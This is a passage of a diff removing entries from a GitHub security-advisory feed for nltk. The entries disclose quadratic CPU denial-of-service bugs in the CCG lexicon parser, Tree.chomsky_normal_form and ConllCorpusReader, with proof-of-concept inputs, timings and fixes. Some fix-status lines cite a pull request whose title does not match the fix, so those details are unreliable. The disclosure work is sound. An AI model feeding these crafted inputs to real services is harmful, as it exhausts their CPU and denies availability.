-Vector A (matchBrackets, flat body):     n=50k 0.078s | 100k 0.260s | 200k 1.046s | 400k 2.083s   (~4x per doubling =&gt; O(n^2))
-Vector B (augParseCategory, operators):  m=4k 0.078s | 8k 0.215s | 16k 0.485s | 32k 1.329s        (super-linear)
-</code></pre>
-<h2 id="attack-chain">Attack Chain</h2>
-<ol>
-<li><strong>Exposure:</strong> An application calls the public <code>nltk.ccg.lexicon.fromstring(lex_str)</code> (also reachable as <code>nltk.ccg.chart.fromstring</code>) on lexicon text the attacker can influence.</li>
-<li><strong>Control:</strong> The attacker fully controls the body width (a run of characters inside one bracket) and the operator-chain length; neither is capped by <code>fromstring</code>.</li>
-<li><strong>Path:</strong> <code>fromstring</code> splits input into lines and routes each category through <code>nextCategory</code>, which dispatches to <code>matchBrackets</code> (Vector A) or into the <code>augParseCategory</code> operator loop (Vector B).</li>
-<li><strong>Guard:</strong> The only relevant guard is the <code>MAX_PARSE_DEPTH = 500</code> recursion-depth check. On flat input the recursion depth is zero, so <code>if _depth &gt; max_depth</code> is never reached; the width loops run unbounded.</li>
-<li><strong>Primitive:</strong> The tail re-slice <code>rest = rest[1:]</code> and tail re-copy <code>rest = app[3]</code> execute a quadratic number of string copies.</li>
-<li><strong>Result:</strong> Sustained single-core CPU exhaustion; a few-megabyte lexicon costs tens of seconds and scales quadratically, blocking the parsing thread.</li>
-</ol>
-<h2 id="bypass-evidence">Bypass Evidence</h2>
-<p>The one protection present on this path is the recursion-depth guard <code>MAX_PARSE_DEPTH = 500</code> (nltk/ccg/lexicon.py:22), checked at lexicon.py:153 and lexicon.py:228. It defends only against nesting depth and raises a bounded <code>ValueError</code> for deeply nested categories. The quadratic payloads here are flat: a single bracket body or a single operator run has nesting depth zero to one, so the depth check provably never fires while the width loops consume quadratic time. This was confirmed by running the shipped parser: the payloads complete without a <code>ValueError</code> or a regex <code>TimeoutError</code> while consuming quadratic CPU (Vector A shows a clean 4x cost per input doubling). A repository search finds no line-length or category-width cap anywhere on the <code>fromstring</code> path; the regex source-length limit bounds regex patterns, not lexicon text. The strongest disproof attempt (that CPython in-place string concatenation makes Vector A linear) fails because <code>rest = rest[1:]</code> is an unconditional copy of the remaining input that the concatenation fast path cannot elide, and the measured 4x-per-doubling ratio confirms the quadratic empirically.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li><code>Ecosystem: PyPI (pip)</code></li>
-<li><code>Package: nltk</code></li>
-<li><code>Confirmed affected range: &lt;= 3.10.3</code></li>
-<li><code>Latest release checked: 3.10.3 (PyPI, https://pypi.org/pypi/nltk/json)</code></li>
-<li><code>Fix status: 3.10.4</code></li>
-</ul>
-<p>The width-slicing loops ship in every release carrying the CCG lexicon parser and are present in the current latest published release, 3.10.3. The lower boundary was not bisected, so the introducing version is left open; the behavior long predates the recent regular-expression and recursion-depth hardening.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Scan the bracket body and the operator chain with an index cursor into the original string (or a <code>collections.deque</code>) instead of repeatedly re-slicing or re-copying the tail, so each character is handled in constant amortized time. As defense in depth, impose an explicit bound on lexicon line length and category width at the <code>fromstring</code> chokepoint and raise a bounded error when it is exceeded, mirroring the existing depth guard. No configuration-only mitigation fully removes the exposure for a service that must parse untrusted lexicons; until a fix ships, callers should cap the size of accepted lexicon input and parse it under a CPU or time budget in an isolated worker.</p>
-<p>Reported by zx (GitHub: @manus-pi).</p>
-<h2 id="fix-status">Fix status</h2>
-<p>PR: #3753 "[Do not merge yet] Fix GHSA-8mgp-746c-j5xp: URL-scheme bypass of pathsec.validate_path", open; head da55cab0e at the time of this note (a develop merge on top of 238f81500, the head on which the verdicts below were measured).</p>
-<p>Fix commit: cf12a5e6a (nltk/ccg/lexicon.py: matchBrackets, nextCategory and augParseCategory thread a cursor instead of re-slicing the tail; the trailing capture group is dropped; MAX_PARSE_LEN=100000 caps the input).</p>
-<p>Probe: nltk/test/unit/security_probes/ghsa_89p3_fcch_88ph.py (on the PR). Verdict on the PR head: FIXED (scaling 4.4x over a 4x input; an over-cap chain is rejected by MAX_PARSE_LEN). The advisory PoC re-run on develop 2fa3f48fe: vector A (bracket body, 100k vs 400k) 15.8x and vector B (operator chain, 8k vs 32k) 11.3x over a 4x input, so develop is still VULNERABLE.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-89p3-fcch-88ph">https://github.com/nltk/nltk/security/advisories/GHSA-89p3-fcch-88ph</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-126299">https://nvd.nist.gov/vuln/detail/CVE-2026-126299</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3944">https://github.com/nltk/nltk/pull/3944</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/0bb5b947bd235b950cf2f90e893a498e16da0fe3">https://github.com/nltk/nltk/commit/0bb5b947bd235b950cf2f90e893a498e16da0fe3</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/cf12a5e6a">https://github.com/nltk/nltk/commit/cf12a5e6a</a></li>
-<li><a href="https://github.com/nltk/nltk/releases/tag/v3.10.4">https://github.com/nltk/nltk/releases/tag/v3.10.4</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-before-3.10.4-quadratic-time-denial-of-service-via-ccg-lexicon-fromstring">https://www.vulncheck.com/advisories/nltk-before-3.10.4-quadratic-time-denial-of-service-via-ccg-lexicon-fromstring</a></li>
-<li><a href="https://github.com/advisories/GHSA-89p3-fcch-88ph">https://github.com/advisories/GHSA-89p3-fcch-88ph</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-89p3-fcch-88ph</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-14T00:08:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: Quadratic-time CPU denial of service in Tree.chomsky_normal_form right-factor binarization via list.pop(0)]]></title>
-        <id>https://github.com/advisories/GHSA-r53h-rw34-8h97</id>
-        <link href="https://github.com/advisories/GHSA-r53h-rw34-8h97"/>
-        <updated>2026-11-14T00:08:00.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>nltk</td>
-<td><code>&lt;= 3.10.3</code></td>
-<td><code>3.10.4</code></td>
-</tr>
-</tbody>
-</table>
-<h2 id="summary">Summary</h2>
-<p><code>Tree.chomsky_normal_form()</code> binarizes a parse tree and defaults to right factoring. For a node with N children the right-factor branch repeatedly removes the first element of a working list with <code>list.pop(0)</code>, which shifts all remaining elements each time, so binarizing one wide node costs O(N^2). An application that converts an attacker-supplied treebank tree to Chomsky Normal Form can be forced into tens of seconds of single-threaded CPU by one wide flat tree. No authentication or user interaction is required.</p>
-<h2 id="root-cause">Root Cause</h2>
-<p>In the default right-factor branch the transform executes <code>curNode[0:] = [nodeCopy.pop(0), newNode]</code> inside a loop over the N children of a node. <code>list.pop(0)</code> is O(len) because it shifts every remaining element down by one; performed N-2 times over a shrinking length-N list this sums to O(N^2). The left-factor branch instead uses <code>nodeCopy.pop()</code> (removing the last element), which is O(1) and linear overall, so the two branches differ only by this front-versus-back removal. No cap is placed on the child count of a node, and the public <code>Tree.fromstring</code> parser accepts an arbitrarily wide bracketed tree.</p>
-<pre><code class="language-text">Affected function:
-- nltk.tree.transforms.chomsky_normal_form (nltk/tree/transforms.py; right-factor sink at line 168, O(1) left control at line 179)
-Public entry points: nltk.tree.Tree.chomsky_normal_form (nltk/tree/tree.py:455, default factor="right"); nltk.tree.Tree.fromstring (nltk/tree/tree.py:592).
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An attacker who can influence the tree that an application normalizes to Chomsky Normal Form causes sustained single-threaded CPU consumption (availability loss). The path is network-reachable (AV:N) and needs no privileges or user interaction (PR:N, UI:N). Because the cost grows quadratically with the attacker-chosen child count, roughly 1.5 MB of treebank input costs about 14 seconds on one core and scales as N^2 above that. Confidentiality and integrity are not affected. The NLTK regular-expression wall-clock timeout wraps regex matching only and does not wrap this pure-Python list loop.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<pre><code class="language-text">Environment: nltk 3.10.3, CPython. Drive the public transform on a wide flat tree.
-</code></pre>
-<pre><code class="language-python">import time
-from nltk.tree import Tree
-
-for N in (80000, 160000, 320000):
-    s = "(S " + "(A a)" * N + ")"
-    t = Tree.fromstring(s)
-    start = time.perf_counter()
-    t.chomsky_normal_form()          # default factor="right"
-    print("right", N, round(time.perf_counter() - start, 3), "s")
-</code></pre>
-<pre><code class="language-text">right (default):  N=80000 1.972s | N=160000 5.004s (2.54x) | N=320000 14.518s (2.90x)   -&gt; super-linear
-left  (control):  N=80000 1.399s | N=160000 2.731s (1.95x) | N=320000  5.379s (1.97x)   -&gt; linear
-</code></pre>
-<h2 id="attack-chain">Attack Chain</h2>
-<ol>
-<li><strong>Exposure:</strong> An application parses an attacker-influenced treebank string with the public <code>Tree.fromstring</code> and normalizes it with <code>Tree.chomsky_normal_form()</code>.</li>
-<li><strong>Control:</strong> The attacker controls the number of children of a node (a wide flat tree such as <code>(S (A a)(A a)...(A a))</code>); no child-count cap exists in <code>fromstring</code> or the transform.</li>
-<li><strong>Path:</strong> <code>Tree.chomsky_normal_form</code> delegates to <code>nltk.tree.transforms.chomsky_normal_form</code> with the default <code>factor="right"</code>.</li>
-<li><strong>Guard:</strong> None. There is no width bound on the loop, and the regex match timeout does not wrap this pure-Python list operation.</li>
-<li><strong>Primitive:</strong> <code>curNode[0:] = [nodeCopy.pop(0), newNode]</code> performs an O(N) front shift on each of N iterations.</li>
-<li><strong>Result:</strong> O(N^2) single-core CPU exhaustion; roughly 1.5 MB of input costs about 14 seconds and scales quadratically, blocking the processing thread.</li>
-</ol>
-<h2 id="bypass-evidence">Bypass Evidence</h2>
-<p>There is no guard to bypass on this path: neither <code>Tree.fromstring</code> nor <code>chomsky_normal_form</code> caps the child count, and the regular-expression wall-clock timeout wraps only regex matching, not this list loop. The finding was confirmed by fresh timing that isolates the cause: the right-factor default and the left-factor branch build the identical bounded head strings and copy the node once, so the only differing term is <code>pop(0)</code> versus <code>pop()</code>. The measured right-versus-left divergence grows with N (right rises toward a 4x per-doubling ratio while left holds near 2x), which proves a quadratic component beyond the shared linear costs. A relevant corroboration is that the inverse transform <code>un_chomsky_normal_form</code> was already rewritten to a single linear pass to remove exactly this quadratic class (see the comment at nltk/tree/transforms.py:195-201), while the forward default path retained the <code>pop(0)</code> idiom. The strongest disproof attempt (that the head-string join dominates and is linear) fails because that join is bounded and present in both branches and therefore cannot explain the branch-dependent quadratic growth.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li><code>Ecosystem: PyPI (pip)</code></li>
-<li><code>Package: nltk</code></li>
-<li><code>Confirmed affected range: &lt;= 3.10.3</code></li>
-<li><code>Latest release checked: 3.10.3 (PyPI, https://pypi.org/pypi/nltk/json)</code></li>
-<li><code>Fix status: 3.10.4</code></li>
-</ul>
-<p>The right-factor <code>pop(0)</code> idiom ships in every release carrying this transform and is present in the current latest published release, 3.10.3. The lower boundary was not bisected, so the introducing version is left open.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Rewrite the right-factor binarization to avoid removing from the front of a list: iterate the children with an index cursor or a <code>collections.deque</code> so each step is constant time, mirroring the linear rebuild already applied to <code>un_chomsky_normal_form</code>. As defense in depth, bound the child count accepted for normalization and raise a clear error past a configurable maximum. No configuration-only mitigation removes the exposure for a service that normalizes untrusted trees; until a fix ships, callers should cap accepted tree width and run the transform under a CPU or time budget in an isolated worker.</p>
-<p>Reported by zx (GitHub: @manus-pi).</p>
-<h2 id="fix-status-2026-09-28">Fix status (2026-09-28)</h2>
-<p>PR: #3909 "Fix quadratic DoS in Tree.chomsky_normal_form right-factor binarization (GHSA-r53h-rw34-8h97)", merged 2026-09-23, merge commit 2f53e20ce on develop.</p>
-<p>Fix commits: 457ebe349 (linear front consume in chomsky_normal_form) and 677857dca (refuse a binarisation that would nest a tree beyond MAX_TREE_DEPTH). Follow-up #3917 (merge 9ba132e43, commit f0686dea6) walks Tree equality and conversion with an explicit stack so the deep-tree tests pass on Python 3.10 and 3.11.</p>
-<p>Probe: nltk/test/unit/security_probes/ghsa_r53h_rw34_8h97.py; verdict on develop 2fa3f48fe: FIXED (chomsky_normal_form scales 5.1x over a 4x input).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-r53h-rw34-8h97">https://github.com/nltk/nltk/security/advisories/GHSA-r53h-rw34-8h97</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-126298">https://nvd.nist.gov/vuln/detail/CVE-2026-126298</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3909">https://github.com/nltk/nltk/pull/3909</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/457ebe349f8dd8080224f76a64aff806dd437057">https://github.com/nltk/nltk/commit/457ebe349f8dd8080224f76a64aff806dd437057</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/677857dcafd84e4591865d976b562a27dfde566e">https://github.com/nltk/nltk/commit/677857dcafd84e4591865d976b562a27dfde566e</a></li>
-<li><a href="https://github.com/nltk/nltk/releases/tag/v3.10.4">https://github.com/nltk/nltk/releases/tag/v3.10.4</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-before-3.10.4-quadratic-cpu-denial-of-service-via-tree-chomsky-normal-form">https://www.vulncheck.com/advisories/nltk-before-3.10.4-quadratic-cpu-denial-of-service-via-tree-chomsky-normal-form</a></li>
-<li><a href="https://github.com/advisories/GHSA-r53h-rw34-8h97">https://github.com/advisories/GHSA-r53h-rw34-8h97</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r53h-rw34-8h97</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-14T00:07:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] Duplicate Advisory: Quadratic-time CPU denial of service in Tree.chomsky_normal_form right-factor binarization via list.pop(0)]]></title>
-        <id>https://github.com/advisories/GHSA-6665-2vj3-h76r</id>
-        <link href="https://github.com/advisories/GHSA-6665-2vj3-h76r"/>
-        <updated>2026-11-14T00:06:58.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>nltk</td>
-<td><code>&lt; 3.10.4</code></td>
-<td>No fix available</td>
-</tr>
-</tbody>
-</table>
-<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-r53h-rw34-8h97. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>NLTK before 3.10.4 contains a denial of service vulnerability in Tree.chomsky_normal_form that allows remote attackers to exhaust CPU through quadratic-time right-factor binarization using list.pop(0). Attackers can supply a wide flat treebank tree parsed by Tree.fromstring to force tens of seconds of single-threaded CPU consumption, blocking the processing thread.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-r53h-rw34-8h97">https://github.com/nltk/nltk/security/advisories/GHSA-r53h-rw34-8h97</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-126298">https://nvd.nist.gov/vuln/detail/CVE-2026-126298</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-before-3.10.4-quadratic-cpu-denial-of-service-via-tree-chomsky-normal-form">https://www.vulncheck.com/advisories/nltk-before-3.10.4-quadratic-cpu-denial-of-service-via-tree-chomsky-normal-form</a></li>
-<li><a href="https://github.com/advisories/GHSA-6665-2vj3-h76r">https://github.com/advisories/GHSA-6665-2vj3-h76r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6665-2vj3-h76r</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-13T12:31:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: Quadratic-time CPU denial of service in ConllCorpusReader SRL instance builder via nested span rescan]]></title>
-        <id>https://github.com/advisories/GHSA-v8f3-6phw-6mh9</id>
-        <link href="https://github.com/advisories/GHSA-v8f3-6phw-6mh9"/>
-        <updated>2026-11-14T00:05:58.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>nltk</td>
-<td><code>&lt;= 3.10.3</code></td>
-<td><code>3.10.4</code></td>
-</tr>
-</tbody>
-</table>
-<h2 id="summary">Summary</h2>
-<p><code>ConllCorpusReader.srl_instances()</code> builds semantic-role-labeling instances from a CoNLL corpus block. For a sentence block with P predicates and P span columns, the instance builder rescans every span column (and every span within it) once per predicate while searching for each predicate's head, giving O(P^2 * R) work. A single well-formed block that places the head span in the last column forces the full scan on every predicate, so an application that reads an attacker-supplied CoNLL SRL corpus can be driven into tens of seconds of single-threaded CPU. No authentication or user interaction is required.</p>
-<h2 id="root-cause">Root Cause</h2>
-<p><code>_get_srl_instances</code> iterates over the P predicates of a block; for each predicate it scans every span list and every span within it, using an inner <code>break</code> that stops only when a span tagged <code>V</code> or <code>C-V</code> containing the predicate word is found. When the sole head span is placed in the last span column, no earlier column matches, so the <code>for ... else: continue</code> construct traverses every span of every earlier column before matching. Over P predicates each scanning up to P columns of R spans, the cost is O(P^2 * R). The block is read whole with no size cap, and the grid-consistency check enforces only uniform column count, not a bound on P, R, or total work.</p>
-<pre><code class="language-text">Affected function:
-- nltk.corpus.reader.conll.ConllCorpusReader._get_srl_instances (nltk/corpus/reader/conll.py:394-424; nested rescan at lines 405-419)
-Public entry point: nltk.corpus.reader.conll.ConllCorpusReader.srl_instances (nltk/corpus/reader/conll.py:158-169).
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An attacker who can supply a CoNLL corpus that an application loads and iterates with <code>srl_instances()</code> causes sustained single-threaded CPU consumption (availability loss). The path is network-reachable through any corpus-ingestion surface (AV:N) and needs no privileges or user interaction (PR:N, UI:N). Because the cost is super-linear in attacker-chosen predicate and column counts, a roughly 1 MB crafted corpus pins a core for tens of seconds and a few megabytes reaches minutes. Confidentiality and integrity are not affected. The NLTK regular-expression wall-clock timeout wraps regex matching only and does not cover this pure-Python nested loop over the parsed grid. Exploitation requires the application to use the SRL-specific API on untrusted CoNLL data with <code>words</code>, <code>pos</code>, <code>tree</code>, and <code>srl</code> columns; a deployment that never calls <code>srl_instances()</code> is unaffected.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<pre><code class="language-text">Environment: nltk 3.10.3, CPython. Stage a crafted CoNLL corpus under an authorized data root and iterate srl_instances().
-Corpus construction: one blank-line-delimited block with P predicate rows and P SRL span columns, the sole "V" head span in the last column.
-</code></pre>
-<pre><code class="language-python">import time, os, tempfile
-from nltk.corpus.reader.conll import ConllCorpusReader
-
-def build_block(n):
-    # n predicates, n SRL columns; the single V head placed in the last column
-    # (columns: words pos tree srl...): emit n predicate rows and n SRL span
-    # columns, with the single "V" head span placed in the final column.
-    ...
-
-for n in (40, 80, 160, 320):
-    root = tempfile.mkdtemp()
-    open(os.path.join(root, "c.conll"), "w").write(build_block(n))
-    r = ConllCorpusReader(root, ["c.conll"], ("words", "pos", "tree", "srl"))
-    t = time.perf_counter()
-    list(r.srl_instances())
-    print(n, round(time.perf_counter() - t, 3), "s")
-</code></pre>
-<pre><code class="language-text">Negative control (single predicate): n=40 -&gt; 1.88 ms ; n=320 -&gt; 4.45 ms      (flat)
-Attack (P=R=n):  n=40 -&gt; 0.022s (10 KB) | n=80 -&gt; 0.148s (39 KB) | n=160 -&gt; 1.164s (156 KB) | n=320 -&gt; 10.002s (619 KB)
-</code></pre>
-<p>The attack timing rises about 8x per doubling of n while the file grows only about 4x, confirming super-linear cost driven by attacker-chosen predicate and column count; the single-predicate control stays in the millisecond range.</p>
-<h2 id="attack-chain">Attack Chain</h2>
-<ol>
-<li><strong>Exposure:</strong> An application loads an attacker-supplied CoNLL corpus (columns include <code>srl</code>) and iterates it with the public <code>ConllCorpusReader(...).srl_instances()</code>.</li>
-<li><strong>Control:</strong> The attacker controls the predicate count P, the span-column count, and the placement of the single head span; the block is read whole with no size cap.</li>
-<li><strong>Path:</strong> <code>srl_instances()</code> calls <code>_get_srl_instances</code>, which pairs each predicate against the span columns via a doubly-nested scan.</li>
-<li><strong>Guard:</strong> The inner <code>break</code> on the first matching <code>V</code> or <code>C-V</code> head is defeated by placing the sole head span in the last column, so every earlier column is scanned in full. The path-containment sandbox bounds where files load, not how much work a block costs.</li>
-<li><strong>Primitive:</strong> The nested rescan performs O(P^2 * R) span comparisons with no work cap or timeout.</li>
-<li><strong>Result:</strong> Sustained single-core CPU exhaustion; a roughly 1 MB corpus costs tens of seconds and scales super-linearly, blocking the processing thread.</li>
-</ol>
-<h2 id="bypass-evidence">Bypass Evidence</h2>
-<p>The only short-circuit on this path is the inner <code>break</code> that fires when a predicate's <code>V</code> or <code>C-V</code> head span is found. It is defeated by construction: placing the sole head span in the last span column means no earlier column matches, so the <code>for ... else: continue</code> traverses every span of every earlier column for every predicate. This was confirmed in source (nltk/corpus/reader/conll.py:405-419) and reproduced end-to-end through the real public <code>srl_instances()</code> API, where the attack timing scales super-linearly while a single-predicate control stays flat. The path-containment sandbox is a file-location control and imposes no bound on parse cost, and the regular-expression timeout does not wrap this loop. The strongest disproof attempts (that Python <code>range</code> membership is O(1) so the loop is linear, and that the <code>break</code> fires early) both fail: the O(1) membership test is evaluated once per span, and the number of spans traversed is exactly what the last-column head placement maximizes.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li><code>Ecosystem: PyPI (pip)</code></li>
-<li><code>Package: nltk</code></li>
-<li><code>Confirmed affected range: &lt;= 3.10.3</code></li>
-<li><code>Latest release checked: 3.10.3 (PyPI, https://pypi.org/pypi/nltk/json)</code></li>
-<li><code>Fix status: 3.10.4</code></li>
-</ul>
-<p>The nested rescan ships in every release carrying this reader and is present in the current latest published release, 3.10.3. The lower boundary was not bisected, so the introducing version is left open; the behavior predates the recent regular-expression hardening.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Replace the per-predicate linear search over all span columns with a single pass that indexes head spans by word position (for example, build a map from word index to the owning span column once, then look up each predicate in constant time), reducing the total cost to about O(P * R). As defense in depth, bound the predicate and span counts accepted from a single block and process untrusted corpora under a CPU or time budget. No configuration-only mitigation removes the exposure for a service that must read untrusted CoNLL SRL data; until a fix ships, callers should cap accepted corpus size and isolate the parsing worker.</p>
-<p>Reported by zx (GitHub: @manus-pi).</p>
-<h2 id="fix-status-2026-09-28">Fix status (2026-09-28)</h2>
-<p>PR: #3753 "[Do not merge yet] Fix GHSA-8mgp-746c-j5xp: URL-scheme bypass of pathsec.validate_path", open; head da55cab0e at the time of this note (a develop merge on top of 238f81500, the head on which the verdicts below were measured).</p>
-<p>Fix commit: cf12a5e6a "Patch seven algorithmic-DoS and path/exec GHSA classes across all affected modules" (ConllCorpusReader._get_srl_instances builds a one-pass wordnum to spanlist index instead of rescanning per predicate).</p>
-<p>Probe: nltk/test/unit/security_probes/ghsa_v8f3_6phw_6mh9.py (on the PR). Verdict on the PR head: FIXED (srl_instances scaled 3.9x over 4x predicates). The same probe run against develop 2fa3f48fe: VULNERABLE (45.8x over 4x predicates).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-v8f3-6phw-6mh9">https://github.com/nltk/nltk/security/advisories/GHSA-v8f3-6phw-6mh9</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-126297">https://nvd.nist.gov/vuln/detail/CVE-2026-126297</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3933">https://github.com/nltk/nltk/pull/3933</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/7bae75fc0f7b1f057ff7d89d24c81bb5a4a0f05a">https://github.com/nltk/nltk/commit/7bae75fc0f7b1f057ff7d89d24c81bb5a4a0f05a</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/9cacbb95d97eaac7debb30d6e7decbe74d2c635f">https://github.com/nltk/nltk/commit/9cacbb95d97eaac7debb30d6e7decbe74d2c635f</a></li>
-<li><a href="https://github.com/nltk/nltk/releases/tag/v3.10.4">https://github.com/nltk/nltk/releases/tag/v3.10.4</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-before-3.10.4-cpu-denial-of-service-via-conllcorpusreader-srl-instances">https://www.vulncheck.com/advisories/nltk-before-3.10.4-cpu-denial-of-service-via-conllcorpusreader-srl-instances</a></li>
-<li><a href="https://github.com/advisories/GHSA-v8f3-6phw-6mh9">https://github.com/advisories/GHSA-v8f3-6phw-6mh9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v8f3-6phw-6mh9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-14T00:05:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] Duplicate Advisory: Quadratic-time CPU denial of service in ConllCorpusReader SRL instance builder via nested span rescan]]></title>
-        <id>https://github.com/advisories/GHSA-qvhx-rvgc-jhwf</id>
-        <link href="https://github.com/advisories/GHSA-qvhx-rvgc-jhwf"/>
-        <updated>2026-11-14T00:04:16.000Z</updated>
-        <content type="html"><![CDATA[<h3>Affected versions</h3>
-<table>
-<thead><tr><th>Package</th><th>Vulnerable versions</th><th>Patched version</th></tr></thead>
-<tbody>
-<tr>
-<td>nltk</td>
-<td><code>&lt; 3.10.4</code></td>
-<td>No fix available</td>
-</tr>
-</tbody>
-</table>
-<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-v8f3-6phw-6mh9. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>NLTK before 3.10.4 contains a quadratic-time denial of service vulnerability in ConllCorpusReader._get_srl_instances that allows remote attackers to exhaust CPU through nested span rescans. Attackers can supply a crafted CoNLL SRL corpus with many predicates and span columns, placing the head span last, to pin a core for minutes.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-v8f3-6phw-6mh9">https://github.com/nltk/nltk/security/advisories/GHSA-v8f3-6phw-6mh9</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-126297">https://nvd.nist.gov/vuln/detail/CVE-2026-126297</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-before-3.10.4-cpu-denial-of-service-via-conllcorpusreader-srl-instances">https://www.vulncheck.com/advisories/nltk-before-3.10.4-cpu-denial-of-service-via-conllcorpusreader-srl-instances</a></li>
-<li><a href="https://github.com/advisories/GHSA-qvhx-rvgc-jhwf">https://github.com/advisories/GHSA-qvhx-rvgc-jhwf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qvhx-rvgc-jhwf</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-11-13T12:31:16.000Z</published>
     </entry>
 </feed>
